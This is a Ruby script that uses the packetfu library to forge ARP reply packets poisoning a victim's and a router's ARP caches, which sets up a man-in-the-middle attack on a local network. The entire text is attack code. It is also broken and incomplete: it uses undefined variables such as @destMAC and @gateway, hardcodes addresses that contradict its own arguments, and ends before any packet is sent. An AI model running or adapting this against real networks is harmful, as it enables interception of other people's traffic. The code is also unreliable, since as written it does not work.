require 'rubygems'
require 'packetfu'
require 'thread'

unless (ARGV.size == 2)
	puts "Usage: ruby #{$0} [Interface] [Victim IP]"
	puts "Example: ruby #{$0} em1 192.168.0.2"
	exit
end

def initialize(intface, victimIP)
	@interface = intface
	@victimIP = victimIP
	@routerIP = "192.168.0.100"
	@srcMAC = PacketFu::Utils.whoami?(:iface => @interface)
	@victimMAC = PacketFu::Utils.arp(@victimIP, :iface => @interface)
	@routerMAC = PacketFu::Utils.arp(@routerIP, :iface => @interface)

	#Construct the target's packet
	arp_packet_target = PacketFu::ARPPacket.new()
	arp_packet_target.eth_saddr = @srcMAC[:eth_saddr]       # sender's MAC address
	arp_packet_target.eth_daddr = @destMAC       		# target's MAC address
	arp_packet_target.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
	arp_packet_target.arp_daddr_mac = '78:2b:cb:a3:ef:c9'   # target's MAC address
	arp_packet_target.arp_saddr_ip = '192.168.0.100'        # router's IP
	arp_packet_target.arp_daddr_ip = '192.168.0.13'         # target's IP
	arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP reply
	 
	# Construct the router's packet
	arp_packet_router = PacketFu::ARPPacket.new()
	arp_packet_router.eth_saddr = '78:2b:cb:a3:6b:62'       # sender's MAC address
	arp_packet_router.eth_daddr = '00:1a:6d:38:15:ff'       # router's MAC address
	arp_packet_router.arp_saddr_mac = '78:2b:cb:a3:6b:62'   # sender's MAC address
	arp_packet_router.arp_daddr_mac = '00:1a:6d:38:15:ff'   # router's MAC address
	arp_packet_router.arp_saddr_ip = @destIP         	# target's IP
	arp_packet_router.arp_daddr_ip = @gateway        	# router's IP
	arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
